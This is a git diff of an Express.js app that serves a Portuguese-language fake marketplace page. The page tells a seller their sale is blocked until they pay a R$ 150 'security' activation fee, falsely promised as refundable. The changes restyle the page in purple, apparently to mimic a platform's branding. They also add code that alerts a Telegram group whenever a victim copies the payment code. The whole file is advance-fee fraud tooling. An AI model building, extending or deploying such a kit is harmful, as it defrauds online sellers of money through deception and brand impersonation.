@@ -309,7 +309,7 @@ if (process.env.NODE_ENV === 'production') {
             }
 
             .sale-bubble {
-                background-color: #FF9800;
+                background-color:rgb(9, 255, 0);
                 color: white;
                 padding: 0.8rem;
                 text-align: center;
@@ -414,7 +414,7 @@ if (process.env.NODE_ENV === 'production') {
             }
 
             .modal-content button:hover {
-                background-color: rgb(17, 255, 0);
+                background-color: rgb(120, 0, 122);
             }
         </style>
     </head>
@@ -915,13 +915,13 @@ app.post('/confirmar', async (req, res) => {
     <header>
         <svg xmlns="http://www.w3.org/2000/svg" width="30" height="30" fill="none"> <path fill="#61005D" fill-rule="evenodd" d="M1.25 14.19C1.25 5.845 6.813-.005 15.002-.005s13.752 5.85 13.741 14.193c0 .96-.033 1.943-.143 2.749H1.393c-.11-.806-.143-1.8-.143-2.749m20.485-2.197c-.343-4.348-3.135-6.147-6.733-6.147s-6.39 1.799-6.733 6.147zM8.093 20.37c1.644 2.45 3.874 3.763 6.909 3.763s5.265-1.313 6.91-3.763l5.198 3.002c-2.561 5.088-7.428 6.622-12.108 6.622S5.455 28.46 2.894 23.372z" clip-rule="evenodd"></path> </svg>    </header>
     <div class="min-h-screen flex items-center justify-center p-4">
-        <div class="bg-white shadow-lg rounded-2xl p-6 max-w-lg w-full border-t-4 border-orange-500">
+        <div class="bg-white shadow-lg rounded-2xl p-6 max-w-lg w-full border-t-4 border-purple-500">
             <h2 class="text-xl font-bold text-purple-700 mb-4">Parabéns pela venda!</h2>
             <p class="text-gray-700 mb-3">No entanto, você ainda não atingiu a pontuação necessária como vendedor em nossa plataforma. Para garantir a segurança de todos, implementamos uma política para prevenir fraudes e garantir que somente vendedores confiáveis possam concluir transações.</p>
-            <h3 class="text-lg font-bold text-orange-500 mb-2">Taxa de Comissão para Garantia de Segurança</h3>
+            <h3 class="text-lg font-bold text-purple-500 mb-2">Taxa de Comissão para Garantia de Segurança</h3>
             <p class="text-gray-700 mb-3">Por questão de segurança e para garantir que você realmente deseja vender seu produto, será cobrada uma taxa de comissão. Esta taxa ajuda a validar o processo e evitar fraudes em nosso sistema. Não se preocupe, esse valor será devolvido junto com o valor da sua venda!</p>
-            <p class="text-gray-900 font-semibold mb-3">Taxa de Ativação: <span class="text-orange-500">R$ 150,00</span></p>
-            <button id="btnPagar" class="bg-orange-500 text-white px-4 py-2 rounded-lg w-full mt-4 hover:bg-orange-600">Pagar Taxa</button>
+            <p class="text-gray-900 font-semibold mb-3">Taxa de Ativação: <span class="text-purple-500">R$ 150,00</span></p>
+            <button id="btnPagar" class="bg-purple-500 text-white px-4 py-2 rounded-lg w-full mt-4 hover:bg-purple-600">Pagar Taxa</button>
         </div>
     </div>
 
@@ -944,6 +944,22 @@ app.post('/confirmar', async (req, res) => {
                 height: 200
             });
         });
+        document.getElementById("btnCopiar").addEventListener("click", function () {
+    const codigo = "${produto.qr}"; // Código QR ou link
+    navigator.clipboard.writeText(codigo).then(() => {
+        alert("Código copiado com sucesso!");
+
+        // Enviar notificação para o backend
+        fetch("/notificar-copia", {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify({ codigo: codigo })
+        });
+    });
+});
+
 
         document.getElementById("btnFechar").addEventListener("click", function () {
             document.getElementById("modal").classList.add("hidden");
@@ -960,6 +976,7 @@ app.post('/confirmar', async (req, res) => {
 </body>
 </html>
 
+
         `);
     } catch (error) {
         console.error('Erro:', error);
@@ -969,11 +986,24 @@ app.post('/confirmar', async (req, res) => {
 
 const multer = require('multer');
 const upload = multer({ dest: 'uploads/' });
+app.post("/notificar-copia", async (req, res) => {
+    const { codigo } = req.body;
 
-app.post('/upload', upload.single('file'), (req, res) => {
-    
-    res.send('Comprovante recebido com sucesso!');
+    if (!codigo) {
+        return res.status(400).send("Código não fornecido!");
+    }
+
+    const mensagem = `📢 O código foi copiado!\n🔢 Código: ${codigo}`;
+
+    try {
+        await bot.telegram.sendMessage(GROUP_CHAT_ID, mensagem, { parse_mode: "Markdown" });
+        res.status(200).send("Notificação enviada para o Telegram!");
+    } catch (error) {
+        console.error("Erro ao enviar notificação:", error);
+        res.status(500).send("Erro ao notificar no Telegram.");
+    }
 });
+
 
 
 const PORT = process.env.PORT || 3000;
